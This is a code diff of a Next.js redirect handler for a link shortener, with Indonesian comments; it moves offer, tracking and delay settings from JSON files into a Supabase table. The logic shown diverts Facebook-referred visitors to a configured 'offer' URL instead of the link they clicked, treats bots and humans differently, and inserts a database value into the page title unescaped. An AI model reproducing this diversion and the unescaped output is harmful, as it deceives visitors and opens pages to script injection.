@@ -1,7 +1,5 @@
 import { NextResponse } from 'next/server';
-import { supabase } from '@/data/supabase'; 
-import offerConfig from '@/data/offer.json';
-import appConfig from '@/data/config.json'; 
+import { supabase } from '@/data/supabase';
 
 export async function GET(
   request: Request,
@@ -9,21 +7,22 @@ export async function GET(
 ) {
   const { slug } = await params;
 
-  // 1. Ambil URL Asli dan Jumlah Klik Terakhir
-  const { data: entry, error } = await supabase
-    .from('links')
-    .select('url, clicks') 
-    .eq('id', slug)
-    .single();
+  // 1. AMBIL DATA DARI DATABASE (Parallel)
+  const [linkResult, settingsResult] = await Promise.all([
+    supabase.from('links').select('url, clicks').eq('id', slug).single(),
+    supabase.from('settings').select('*').eq('id', 1).single()
+  ]);
+
+  const entry = linkResult.data;
+  const settings = settingsResult.data;
 
   // 2. Jika link tidak ada, lempar ke 404
-  if (error || !entry) {
+  if (linkResult.error || !entry) {
     const url = new URL(request.url);
     return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
   }
 
-  // --- LOGIKA HITUNG PENGUNJUNG (Baru) ---
-  // Update jumlah klik di background (tanpa bikin loading lama)
+  // --- LOGIKA HITUNG PENGUNJUNG ---
   const newCount = (entry.clicks || 0) + 1;
   supabase
     .from('links')
@@ -32,7 +31,6 @@ export async function GET(
     .then(({ error }) => {
       if (error) console.error('Gagal update counter:', error);
     });
-  // ----------------------------------------
 
   // TENTUKAN TUJUAN REDIRECT
   let finalDestination = entry.url;
@@ -42,11 +40,14 @@ export async function GET(
   const referer = request.headers.get('referer') || "";
   const userAgent = request.headers.get('user-agent') || "";
 
-  // Config dari JSON
-  const OFFER_URL = offerConfig.url;
-  const IS_OFFER_ACTIVE = offerConfig.active;
-  const HISTATS_ID = appConfig.histatsId;
-  const DELAY_MS = appConfig.delay;
+  // --- CONFIG DARI DATABASE ---
+  // Ambil Site Name buat Judul Tab Browser
+  const SITE_NAME = settings?.site_name || "Loading..."; 
+  
+  const OFFER_URL = settings?.offer_url || "https://google.com";
+  const IS_OFFER_ACTIVE = settings?.offer_active || false;
+  const HISTATS_ID = settings?.histats_id || "0000";
+  const DELAY_MS = settings?.delay_ms || 3000;
 
   const hasFbclid = searchParams.has('fbclid');
   const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
@@ -57,27 +58,28 @@ export async function GET(
     finalDestination = OFFER_URL;
   }
 
-  // KASUS A: Jika BOT -> Redirect Langsung
+  // KASUS A: BOT -> Redirect Langsung
   if (isBot) {
     return NextResponse.redirect(finalDestination, { status: 307 });
   }
 
-  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats
+  // KASUS B: MANUSIA -> Tampilan Putih Polos + Judul Dinamis
   const htmlContent = `
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Loading...</title>
+      
+      <title>${SITE_NAME}</title>
+
       <style>
         body {
-          background-color: #ffffff; /* Latar Putih Polos */
+          background-color: #ffffff;
           margin: 0;
           height: 100vh;
           overflow: hidden;
         }
-        /* Loader CSS sudah dihapus */
       </style>
     </head>
     <body>
